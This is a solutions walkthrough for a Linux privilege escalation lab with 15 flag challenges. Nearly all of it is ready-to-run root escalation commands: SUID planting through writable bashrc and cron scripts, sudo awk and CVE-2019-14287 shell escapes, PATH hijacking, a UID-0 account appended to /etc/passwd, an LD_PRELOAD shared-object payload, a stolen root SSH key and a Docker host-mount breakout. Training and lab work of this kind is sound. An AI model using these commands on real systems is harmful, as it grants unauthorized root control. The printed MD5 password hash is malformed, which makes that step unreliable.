# Linux Privilege Escalation Lab — Solutions

This document contains step-by-step solutions and command walk-throughs to solve all 15 privilege escalation challenges in the laboratory.

---

## 🟢 Tier 1 — Easy Exploitations

### 1. Weak File Permissions (Writable Files)
*   **Vulnerability**: The global shell initialization script `/etc/bash.bashrc` is world-writable (`666`).
*   **Solution**: Append a command to set the SUID bit on `/bin/bash` when anyone (including root) executes a shell session.
    ```bash
    echo "chmod u+s /bin/bash" >> /etc/bash.bashrc
    ```
    *Trigger*: Simply log in again or wait for a root interaction/reboot, then run:
    ```bash
    /bin/bash -p
    cat /root/flag1.txt
    ```

### 2. SUID Binary Abuse (SUID find)
*   **Vulnerability**: The `/usr/bin/find` executable has the SUID bit set (`-rwsr-xr-x`).
*   **Solution**: Run `find` with the `-exec` flag to execute `/bin/sh` or `/bin/bash` with SUID privilege preservation.
    ```bash
    find . -exec /bin/sh -p \; -quit
    # Spawned root shell
    cat /root/flag2.txt
    ```

### 3. Misconfigured sudo Rights (sudo -l)
*   **Vulnerability**: Overly permissive sudo rules permitting `/usr/bin/awk` execution, combined with CVE-2019-14287 (sudo bypass).
*   **Solution**:
    *   **Method A (Sudo awk)**:
        ```bash
        sudo awk 'BEGIN {system("/bin/sh")}'
        cat /root/flag3.txt
        ```
    *   **Method B (Sudo CVE-2019-14287)**:
        ```bash
        sudo -u#-1 /bin/bash
        cat /root/flag3.txt
        ```

### 4. Password Reuse (User -> Root)
*   **Vulnerability**: The root user account shares the same password (`student123`) as the low-privilege `student` user.
*   **Solution**: Switch users using `su`:
    ```bash
    su - root
    # Password: student123
    cat /root/flag4.txt
    ```

### 5. World Writable Cron Jobs
*   **Vulnerability**: A cron job owned by root runs the script `/usr/local/bin/cleanup.sh` every minute. The script is world-writable (`777`).
*   **Solution**: Append a reverse shell or SUID copy command to the script:
    ```bash
    echo "chmod u+s /bin/bash" >> /usr/local/bin/cleanup.sh
    # Wait 60 seconds
    /bin/bash -p
    cat /root/flag5.txt
    ```

---

## 🟡 Tier 2 — Medium Escalations

### 6. PATH Hijacking
*   **Vulnerability**: SUID binary `/usr/local/bin/status_check` invokes `service apache2 status` without using the absolute path to `/usr/sbin/service`.
*   **Solution**: Create a script named `service` in a directory under your control (e.g. `/tmp`), configure it to spawn a shell or change permissions, add `/tmp` to the front of your `PATH`, and run the target binary:
    ```bash
    echo -e '#!/bin/bash\n/bin/bash -p' > /tmp/service
    chmod +x /tmp/service
    export PATH=/tmp:$PATH
    /usr/local/bin/status_check
    # Inside SUID root bash shell:
    cat /root/flag6.txt
    ```

### 7. Writable Service Executables
*   **Vulnerability**: A systemd service executes `/usr/local/bin/custom-daemon` (world-writable). The user can restart this service via sudo.
*   **Solution**: Modify the custom daemon script to set SUID on `/bin/bash` or write the flag, then restart the service:
    ```bash
    echo -e '#!/bin/bash\ncat /root/flag7.txt > /tmp/flag7_out' > /usr/local/bin/custom-daemon
    sudo /bin/systemctl restart vuln-service.service
    cat /tmp/flag7_out
    ```

### 8. Sensitive Files Exposure
*   **Vulnerability**: A backup file `/var/backups/root_ssh.bak` is world-readable and contains root's private SSH key.
*   **Solution**: Copy the private key, change its permissions to read-only for owner (`600`), and connect via SSH to root on localhost:
    ```bash
    cp /var/backups/root_ssh.bak /tmp/id_rsa
    chmod 600 /tmp/id_rsa
    ssh -i /tmp/id_rsa root@localhost
    # Inside root SSH shell:
    cat /root/flag8.txt
    ```

### 9. Writable /etc/passwd
*   **Vulnerability**: `/etc/passwd` has world-writable permissions (`666`).
*   **Solution**: Generate a hash of a known password and append a new user with UID/GID 0 (equivalent to root):
    ```bash
    # Generate password hash for password 'pass123'
    openssl passwd -1 -salt saltsalt pass123
    # Output: $1$saltsalt$ib7wQodra.Sl.Ob2g/W1UhRPQ/6wIfsaNDjqp9Pw9MxSYaCMxyP..
    
    # Append the new user to /etc/passwd
    echo 'hacker:$1$saltsalt$ib7wQodra.Sl.Ob2g/W1UhRPQ/6wIfsaNDjqp9Pw9MxSYaCMxyP..:0:0:root:/root:/bin/bash' >> /etc/passwd
    
    # Switch to the new root-level account
    su hacker
    # Password: pass123
    cat /root/flag9.txt
    ```

### 10. Cron PATH Injection
*   **Vulnerability**: The global cron environment has a custom PATH set at the top of `/etc/crontab` which searches `/home/student` first. A scheduled job runs `cron_cleanup` without an absolute path.
*   **Solution**: Write a script named `cron_cleanup` to `/home/student`, make it executable, and wait for cron execution (runs every minute):
    ```bash
    echo -e '#!/bin/bash\nchmod u+s /bin/bash' > /home/student/cron_cleanup
    chmod +x /home/student/cron_cleanup
    # Wait 60 seconds
    /bin/bash -p
    cat /root/flag10.txt
    ```

---

## 🔴 Tier 3 — Domination & Breakouts

### 11. NFS Misconfiguration
*   **Vulnerability**: NFS share configured with `no_root_squash`. (Simulated in the lab container by a daemon checking for files in `/srv/nfs`).
*   **Solution**: Compile a small C executable that runs commands with root UID/GID preservation, write it to `/srv/nfs/nfs_exploit`, wait 60 seconds for the auto-SUID daemon to set it to root SUID, and run it:
    ```bash
    echo -e '#include <stdlib.h>\n#include <unistd.h>\nint main() { setuid(0); setgid(0); system("cat /root/flag11.txt"); return 0; }' > /tmp/nfs_exploit.c
    gcc /tmp/nfs_exploit.c -o /srv/nfs/nfs_exploit
    rm /tmp/nfs_exploit.c
    
    # Wait 60 seconds
    /srv/nfs/nfs_exploit
    ```

### 12. Capabilities Abuse (getcap)
*   **Vulnerability**: The `/usr/bin/python3-cap` binary has the `cap_setuid+ep` capability set, allowing it to modify the process's effective UID.
*   **Solution**: Enumerate the capabilities, then run Python commands setting the UID to 0 before spawning a shell:
    ```bash
    getcap -r / 2>/dev/null
    # Output: /usr/bin/python3-cap = cap_setuid+ep
    
    /usr/bin/python3-cap -c 'import os; os.setuid(0); os.system("/bin/bash")'
    cat /root/flag12.txt
    ```

### 13. Environment Variable Abuse (LD_PRELOAD)
*   **Vulnerability**: Sudoers rule keeps the `LD_PRELOAD` environment variable (`env_keep`), and the user can run `awk` as root without a password.
*   **Solution**: Write a C file containing a constructor function that sets UID/GID to 0 and spawns bash. Compile it as a shared library, and execute `sudo awk` while specifying the shared library in `LD_PRELOAD`:
    ```bash
    cat << 'EOF' > /tmp/pe.c
    #include <stdio.h>
    #include <sys/types.h>
    #include <stdlib.h>
    #include <unistd.h>
    void _init() {
        unsetenv("LD_PRELOAD");
        setgid(0);
        setuid(0);
        system("/bin/bash");
    }
    EOF
    
    gcc -fPIC -shared -nostartfiles -o /tmp/pe.so /tmp/pe.c
    sudo LD_PRELOAD=/tmp/pe.so awk 'BEGIN{}'
    cat /root/flag13.txt
    ```

### 14. Kernel Version Enumeration (No Exploit)
*   **Vulnerability**: The SUID binary `/usr/local/bin/kernel_challenge` asks for the specific CVE code representing the famous 2021 OverlayFS privilege escalation vulnerability affecting Ubuntu 18.04 LTS (Bionic).
*   **Solution**: View the system details inside `/home/student/kernel_info.txt` to find kernel info:
    `System Kernel: Linux vulnerable-ubuntu 4.15.0-20-generic #21-Ubuntu SMP`
    Identify that the 2021 OverlayFS local privilege escalation vulnerability affecting this release is **CVE-2021-3493**. Run the challenge and submit the answer:
    ```bash
    /usr/local/bin/kernel_challenge
    # Input when prompted: CVE-2021-3493
    ```

### 15. Docker Group Privilege Escalation (Breakout)
*   **Vulnerability**: The `student` user is a member of the mapped group owning `/var/run/docker.sock`, letting them execute Docker CLI commands.
*   **Solution**: Run a new container mapping the root filesystem of the host/parent container to `/host`, and use `chroot` or run commands against that directory:
    ```bash
    docker run -v /:/host -it alpine chroot /host
    # Inside host chrooted shell:
    cat /root/flag15.txt
    ```
